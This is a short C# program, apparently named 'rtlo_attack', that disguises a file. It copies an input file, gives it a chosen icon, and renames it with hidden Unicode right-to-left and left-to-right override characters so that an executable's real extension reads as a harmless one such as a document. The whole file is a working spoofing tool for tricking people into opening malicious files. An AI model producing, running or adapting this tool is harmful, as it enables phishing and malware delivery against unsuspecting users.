using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace rtlo_attack
{
    class Program
    {
        private static string Reverse(string text)
        {
            char[] charArray = text.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }

        static void Main(string[] args)
        {
            char ltro = '\u202d';
            char rtlo = '\u202e';


            if (args.Length < 2)
            {
                return;
            }

            string inputFile = args[0];
            string iconFile = args[1];

            string filenameWithExtension = inputFile.Split('\\').Last();
            string extension = "." + filenameWithExtension.Split('.').Last();
            string filename = filenameWithExtension.Substring(0, filenameWithExtension.Length - extension.Length);

            string tempFilename = "temp" + extension;

            File.Copy(inputFile, tempFilename);
            IconChanger.InjectIcon(tempFilename, iconFile);

            string fileName;
            if (filename.Contains(extension))
            {
                string[] array = filename.Split(new string[] { extension }, StringSplitOptions.None);

                fileName = array[0] + rtlo + Reverse(array[1]) + ltro + extension;
            }
            else if (filename.Contains(Reverse(extension)))
            {
                string[] array = filename.Split(new string[] { Reverse(extension) }, StringSplitOptions.None);

                fileName = array[0] + rtlo + Reverse(array[1]) + extension;
            }
            else { return; }

            File.Move("temp" + extension, fileName);
        }
    }
}
